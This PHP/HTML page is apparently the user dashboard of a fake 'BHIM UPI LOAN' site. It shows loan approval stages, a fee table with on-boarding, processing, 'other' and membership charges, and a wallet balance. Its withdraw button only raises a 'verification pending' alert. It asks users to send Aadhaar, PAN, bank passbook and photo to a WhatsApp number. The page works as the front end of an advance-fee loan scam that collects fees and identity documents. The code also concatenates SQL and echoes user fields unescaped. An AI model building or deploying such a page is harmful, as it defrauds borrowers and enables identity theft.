 

<?php

ob_start();
session_start();
require_once 'dbconnect.php';

if (!isset($_SESSION['user'])) {
    header("Location: login.php");
    exit;
}


// select logged in users detail
$res = $conn->query("SELECT * FROM users WHERE id=" . $_SESSION['user']);
$userRow = mysqli_fetch_array($res, MYSQLI_ASSOC);

?>




<!DOCTYPE html>
<html lang="en">

  <title>Bootstrap Example</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
  <link rel="stylesheet" type="text/css" href="main.css">
  
  
  
<div class="container1">
<center>
<font color=black size= 8> <b>BHIM UPI LOAN </b></font></center><hr>




        <ul class="progressbar"  style="width:100%" >
            <li class="active">Submitted</li>
            <li  <?php if($userRow['statues']=="approve"){ 
    echo 'class="active"'; }else{}?>
      >Approved</li>
                  
            <li    <?php if($userRow['paydate']==null){}else{  echo 'class="active"';   }  ?>   >Disbursed</li>
            <li    <?php if($userRow['paydate']==0){
            echo 'class="active"'; }else{ if($userRow['paydate']=='close'){ echo 'class="active"';   }else{}}  ?>    >Repayment</li>
        </ul>
    </div>
    
<br>
<body>

<div class="btn-group">
    <button type="button" ><a class="btn btn-primary"  href="#" >LOAN </a>   </button>
    <button type="button" ><a class="btn btn-primary"  href="repay.php" >RE PAY</a>  </button>
    
    <button type="button"> <a class="btn btn-primary"  href="account.php" >ACCOUNT</a></button>
    
    <button type="button" ><a class="btn btn-primary"  href="logout.php?logout" >LOGOUT</a></button>
</div>



<div class="alert alert-secondary">
<h1> <?php echo $userRow['username']; ?></h1>
         <font color="#66cc00" size =4 >  Congress , You are eligible for loan.....</font>
     <strong>    <a class="btn btn-success btn-lg" href="#" role="button">  
<font size="6"color=black>₹ <?php echo $userRow['loan'];?>
    </font></a></strong>
    
    <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#myModal">
    More details
  </button>
    
  </div>
  
  <div class="modal" id="myModal">
    <div class="modal-dialog">
      <div class="modal-content">
      
        <!-- Modal Header -->
        <div class="modal-header">
          <table class="table"> <thead> 
<tr> 
<th></th> 
<th><font color=red>Repayment Amount : INR  <?php echo $userRow['loan']; ?>  </font></th>
 <th></th>
 <th><font color=red>Repayment Date : <?php echo $userRow['paydate']; ?> </font>  </th>
 </tr> 
</thead> <tbody>
 <tr class="table-primary"> 
<td></td> 
<td>Loan Amount</td>
 <td></td> 
<td>INR  <?php echo $userRow['loan']; ?> </td> </tr>
 <tr class="table-secondary"> 
<td></td> 
<td>On Boarding Fee <b>FIRST TIME</b></td> 
<td></td> 
<td>INR 100</td> </tr>
 <tr class="table-success"> 
<td></td>
 <td>Processing Fee</td> 
<td></td>
 <td>INR  <?php $a= $userRow['loan']*0.15; echo $a; ?></td> </tr> 
<tr class="table-info"> 
<td></td>
 <td>OTHER CHARGE 18%on  Processing Fees @</td> 
<td></td> 
<td>INR <?php $a= $userRow['loan']*0.15+100; $b=$a*0.18 ; echo $b; ?></td> </tr> 
<tr class="table-warning"> 
<td></td> 
<td>Total Interest Year @ 18%</td>
 <td></td> 
<td>INR <?php $a= $userRow['loan'] *0.0005*
$userRow['days'] ; echo $a ; echo " ( " .$userRow ['days']." day)";?></td> </tr> 
<tr class="table-danger"> 
<td></td>
 <td>Disbursal Amount</td> 
<td></td> 
<td><font size=4 color=green><b> INR 
<?php 



if($userRow['loan']==1000)
{
$c= $userRow['loan']*0.15+100;
$b=$c*0.18 ;
$d= $userRow['loan'] *0.0005*$userRow['days'] ;
$f= $userRow['loan'] ;
$e= $c+$b+$d ;
$g=$f-$e;
echo $g ;
}else{

$c= $userRow['loan']*0.15;
$b=$c*0.18 ;
$d= $userRow['loan'] *0.0005*$userRow['days'] ;
$f= $userRow['loan'] ;
$e= $c+$b+$d ;
$g=$f-$e;
echo $g ;
}



?></b>
</font>
</td> 
</tr> 
<tr class="table-active"> 
<td></td>
 <td>  Disbursal Date  </td>
 <td></td>
 <td>  <?php echo $userRow['loandate'] ;?>  </td> </tr> 
<tr class="table-light"> 
<td></td>
 <td>Bhim Account</td>
 <td></td> 
<td>   <?php echo $userRow['upi'] ;?>   </td> </tr> 
<tr class="table-dark"> 
<td></td>
 <td>penalty charge </td> 
<td></td>
<td>100rs/week</td> </tr> 
</tbody>
 </table></div>
 <div class="modal-footer">
          <button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>
        </div>
  
  </div>
  </div></div>

<div class="alert alert-light">
    <font size="6" color=black><strong>Wallet Balance</strong></font></strong>

<a class="btn btn-success btn-warning" href="#" role="button">

<?php 
echo"₹ ".$userRow['Wallet'];
 ?>
</a>
  </div>

<div class="alert alert-info"><center>
<?php
  if($userRow['statues']=="approve"){ if($userRow['withdraw']==null){
echo '
<form action="/withdrow.php" method="post"style="width: 240px ;>
  
    <div class="form-group" >
     
      <input type="text" class="form-control" id="withdrow" placeholder="ENTER RS 501" name="withdrow">
    
      <input type="hidden" class="form-control" id="id" name="id"  value="' .$userRow['id']. '">
      
      
      <input type="submit" class="form-control"  value="WITHDRAW AMOUNT">
      
      
    </div>

  </form>';}
}else{  if($userRow['statues']==4){ }else{


echo '<input type="text" class="form-control" id="withdrow" placeholder="ENTER RS 501" name="withdrow"><br>

<button onclick="myFunction()">Withdraw</button>

 ';
}}

?>

<script>
function myFunction() {
  alert("Warning .... Verification Pending sent Document us .");
}

function myFunction2() {
  alert("Warning .... Membership charge INR 200 (Refundable).IF withdraw Membership then withdraw Your INR 200. More information Contact us");
}

</script>
<br>
<?php 
echo$userRow['ph1']."<b> ( RBL Bank Money Services )</b><br>";

if($userRow['otp']==null){
echo '
<form action="#" method="post"style="width: 240px ;>
  
    <div class="form-group" >
      <input type="submit" class="form-control"  value="VERIFY NOW">
      
<font color=red>  Mobile number not verify <br>  </form> </font></div> ';
if(   $userRow['statues']=="approve"){
echo'
<b>( If problem, Technical support : +918327891012 WhatsApp)</b>';}
 }else{

if($userRow['otp']==1){
echo '
<form action="/otp.php" method="post"style="width: 240px ;>
  
    <div class="form-group" >
     
      <input type="hidden" class="form-control" id="otp" value="request" name="otp">
    
      <input type="hidden" class="form-control" id="id" name="id"  value="' .$userRow['id']. '">
      
      
      <input type="submit" class="form-control"  value="VERIFY NOW">
      
     <font color=red>  Mobile number not verify     </font>
    </div>

  </form>';
 }else{



if($userRow['otp']=="request"){
echo '
<form action="/otp.php" method="post"style="width: 240px ;>
  
    <div class="form-group" >
     
      <input type="text" class="form-control" id="otp" placeholder="ENTER OTP" name="otp">
    
      <input type="hidden" class="form-control" id="id" name="id"  value="' .$userRow['id']. '">
      
      
      <input type="submit" class="form-control"  value="SUBMIT OTP">
      <font color=red>  Do not Submit Blank otp     </font>
      
    </div>

  </form>';
 }}}


?>
<?php


if($userRow['statues']==1){

echo "  <font color=red>  Loan Fail Reapply After 30 days     </font>";

}else{  if(   $userRow['statues']=="approve"){

echo "<font color=green> DocumentsVerification Success
</font>";

}else{ if ( $userRow['statues']==3){

echo "<font color=pink>Loan Pending
</font>";

}else{if($userRow['statues']==4){

echo "<font color=green>Loan Success
</font>";

}else{


echo "<font color=#666600>
  Verification Pending sent Document aadhar, pan ,Bank passbook font page , photo  whatsApp </br>
whatsapp : 8967516467
</font>";


}}}} ?>

</center>
</div>


<div class="btn-group">
    <button type="button" ><a class="btn btn-primary"  href="profile.php" >PROFILE </a>   </button>
    <button type="button" ><a class="btn btn-primary"  href="offer.php" >OFFER ZONE</a>  </button>
    
    <button type="button"> <a class="btn btn-primary"  href="#" >INBOX</a></button>
    
    <button type="button" ><a class="btn btn-primary"  href="help.php" >HELP</a></button>
</div>


</body>
</html>
